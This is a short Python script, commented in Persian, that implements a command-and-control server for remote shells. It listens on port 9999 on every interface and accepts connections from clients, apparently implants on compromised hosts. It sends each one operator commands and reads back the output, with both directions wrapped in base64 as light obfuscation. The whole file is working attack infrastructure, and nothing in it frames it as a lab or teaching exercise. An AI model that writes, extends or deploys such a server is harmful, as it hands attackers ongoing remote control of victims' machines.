import socket
import base64
import threading

# IP و پورت سرور فرمان و کنترل
SERVER_IP = '0.0.0.0'
SERVER_PORT = 9999

def handle_client(client_socket):
    while True:
        try:
            command = input("Enter command: ")
            if command.lower() == 'exit':
                client_socket.send(base64.b64encode('exit'.encode('utf-8')))
                break
            else:
                client_socket.send(base64.b64encode(command.encode('utf-8')))
                response = base64.b64decode(client_socket.recv(4096)).decode('utf-8')
                print(response)
        except Exception as e:
            print(f"Error: {str(e)}")
            break
    client_socket.close()

def start_c2_server():
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind((SERVER_IP, SERVER_PORT))
    server_socket.listen(5)
    print("C2 server is listening...")

    while True:
        client_socket, addr = server_socket.accept()
        print(f"Connection from {addr} has been established.")
        client_thread = threading.Thread(target=handle_client, args=(client_socket,))
        client_thread.start()

if __name__ == '__main__':
    start_c2_server()
